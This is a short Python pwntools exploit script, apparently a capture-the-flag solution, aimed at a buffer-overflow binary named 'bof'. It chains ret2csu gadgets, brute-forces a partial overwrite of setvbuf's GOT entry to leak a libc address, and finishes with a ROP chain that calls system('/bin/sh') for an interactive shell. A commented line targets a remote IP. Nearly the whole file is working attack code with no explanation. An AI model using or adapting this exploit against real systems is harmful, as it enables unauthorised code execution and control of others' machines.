from pwn import *
from time import sleep

csu_step1=0x0000000000400686
csu_step2=0x0000000000400670
setvbuf_plt=0x00000000004004c0
setvbuf_got=0x601020

read_got=0x601018
read_plt=0x00000000004004b0
vuln=0x00000000004005b7
pop_rdi=0x0000000000400693
entry=0x4004d0
ret=0x0000000000400496

period=0.2

for i in range(20):
	p=process("./bof/bof")
	#p=remote("52.71.255.44",1234)
	payload=""
	payload+="A"*18
	payload+=p64(csu_step1)
	payload+=p64(0) #chey
	payload+=p64(0) #rbx
	payload+=p64(1) #rbp
	payload+=p64(0x600e48) #r12
	payload+=p64(0) #r13
	payload+=p64(setvbuf_got) #r14
	payload+=p64(2) #r15
	payload+=p64(csu_step2)

	payload+=p64(0) #chey
	payload+=p64(0) #rbx
	payload+=p64(0) #rbp
	payload+=p64(0) #r12
	payload+=p64(0) #r13
	payload+=p64(0) #r14
	payload+=p64(0) #r15
	payload+=p64(read_plt)
	payload+=p64(vuln)
	payload+=p64(ret)
	#print len(payload)
	p.send(payload)
	sleep(period)
	p.send("\x30\x4a")
	sleep(period)

	try:
		payload=""
		payload+="A"*18
		payload+=p64(pop_rdi)
		payload+=p64(read_got)
		payload+=p64(setvbuf_plt)
		payload+=p64(vuln)
		p.sendline(payload)
		data=p.recv(8000)
		leak=u64(data.strip().ljust(8,"\x00"))
		base=leak-0x0000000000110180
		system=base+0x000000000004f4e0
		binsh=base+0x1b40fa
		print "leak :",hex(leak)
		print "base :",hex(base)
		print "system :",hex(system)
		print "binsh :",hex(binsh)
		payload=""
		payload+="A"*18
		payload+=p64(ret)
		payload+=p64(pop_rdi)
		payload+=p64(binsh)
		payload+=p64(system)
		p.sendline(payload)
		p.interactive()
		break
	except:
		c=0
	p.close()







